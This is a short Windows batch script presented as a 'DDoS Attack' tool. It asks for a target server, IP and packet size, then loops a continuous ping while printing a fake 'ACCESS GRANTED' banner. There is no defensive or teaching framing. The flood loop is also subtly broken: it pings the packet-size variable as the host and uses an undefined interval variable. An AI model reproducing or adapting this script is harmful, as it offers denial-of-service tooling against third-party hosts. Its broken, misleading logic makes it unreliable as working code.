@echo off
mode 67,16
title DDoS Attack By Xtc | TeamCode
color 8
cls
echo.
color 2
echo DDOS ATTACK
set /p s=[+]server-enemy[+]
echo.
echo ===================================================================
ping %s%
echo ===================================================================
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
color 9
set /p i=[+]IP HOST[+]:
echo.
color 0c
set /p m=[+]Packet Size[+]:
echo.
:DDOS
color 0c
echo [+]ACCESS GRANTED![+]Attacking : %i% packet : %m%[+]
ping %m% -i %n% -t >nul
goto DDOS
